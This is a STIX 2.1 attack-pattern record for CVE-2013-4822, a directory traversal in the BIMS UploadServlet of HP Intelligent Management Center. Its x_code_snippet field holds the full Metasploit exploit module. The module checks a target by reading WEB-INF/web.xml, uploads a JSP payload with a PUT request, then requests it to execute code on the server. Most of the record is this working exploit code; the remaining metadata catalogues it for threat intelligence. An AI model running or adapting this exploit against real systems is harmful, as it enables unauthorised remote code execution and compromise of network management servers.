{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c3286544-f040-4e76-9067-c20f86f1ed88",
    "created": "2024-08-14T16:52:23.237175Z",
    "modified": "2024-08-14T16:52:23.237178Z",
    "name": "HP Intelligent Management Center BIMS UploadServlet Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability on the version 5.2 of the BIMS component from the HP Intelligent Management Center. The vulnerability exists in the UploadServlet, allowing the user to download and upload arbitrary files. This module has been tested successfully on HP Intelligent Management Center with BIMS 5.2 E0401 on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_imc_bims_upload.rb",
            "external_id": "hp_imc_bims_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4822"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943425"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP Intelligent Management Center BIMS UploadServlet Directory Traversal',\n      'Description' => %q{\n          This module exploits a directory traversal vulnerability on the version 5.2 of the BIMS\n        component from the HP Intelligent Management Center. The vulnerability exists in the\n        UploadServlet, allowing the user to download and upload arbitrary files. This module has\n        been tested successfully on HP Intelligent Management Center with BIMS 5.2 E0401 on Windows\n        2003 SP2.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-4822' ],\n          [ 'OSVDB', '98247' ],\n          [ 'BID', '62895' ],\n          [ 'ZDI', '13-238' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943425' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_JAVA,\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'Targets'     =>\n        [\n          [ 'HP Intelligent Management Center 5.1 E0202 - 5.2 E0401 / BIMS 5.1 E0201 - 5.2 E0401 / Windows', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-10-08'))\n\n    register_options(\n      [\n        Opt::RPORT(8080)\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"/\", \"upload\", \"upload\"),\n      'method' => 'GET',\n      'vars_get' => { 'fileName' => \"WEB-INF/web.xml\" },\n    })\n\n    if res.nil?\n      vprint_error(\"Unable to determine, because the request timed out.\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 200 and res.headers['Content-Type'] =~ /application\\/doc/ and res.body =~ /com\\.h3c\\.imc\\.bims\\.acs\\.server\\.UploadServlet/\n      vprint_status(\"Upload interface found. Must be tested to verify vulnerable state.\")\n      return Exploit::CheckCode::Appears\n    elsif res.code == 405 and res.message =~ /Method Not Allowed/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # New lines are handled on the vuln app and payload is corrupted\n    #jsp = payload.encoded.gsub(/\\x0d\\x0a/, \"\").gsub(/\\x0a/, \"\")\n    jsp_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n\n    print_status(\"Uploading the JSP payload...\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"/\", \"upload\", \"upload\"),\n      'method' => 'PUT',\n      'vars_get' => { 'fileName' => jsp_name },\n      'data' => payload.encoded\n    })\n\n    if  res and res.code == 200 and res.body.empty?\n      print_good(\"JSP payload uploaded successfully\")\n      register_files_for_cleanup(\"..\\\\web\\\\apps\\\\upload\\\\#{jsp_name}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP payload upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(\"/\", \"upload\", jsp_name),\n      'method' => 'GET'\n    }, 1)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-08",
    "x_mitre_platforms": [
        "win'"
    ]
}